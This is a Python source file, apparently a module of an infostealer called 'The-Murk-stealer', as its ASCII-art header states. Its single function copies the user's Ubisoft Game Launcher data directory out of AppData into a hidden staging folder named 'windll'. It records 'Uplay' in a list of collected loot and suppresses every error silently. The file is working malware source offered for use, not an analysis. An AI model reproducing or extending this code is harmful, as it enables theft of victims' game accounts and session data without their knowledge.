#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#

from os import sep,environ
from shutil import copytree
"""
all needed paths
"""
path = r"\Ubisoft Game Launcher"

def Ubisoft(data):
    try:
        pathtofile = environ['USERPROFILE'] + sep + r'AppData\Local'
        #os.makedirs(rf'{pathtofile}\windll\Uplay')
        user = environ['USERPROFILE'] + sep + r'AppData\Local'
        copytree(user+ sep + path,rf'{pathtofile}\windll\Games\Uplay')# copy dir
        data.append("\n∟🎮Uplay")
        return data
    except:
        return data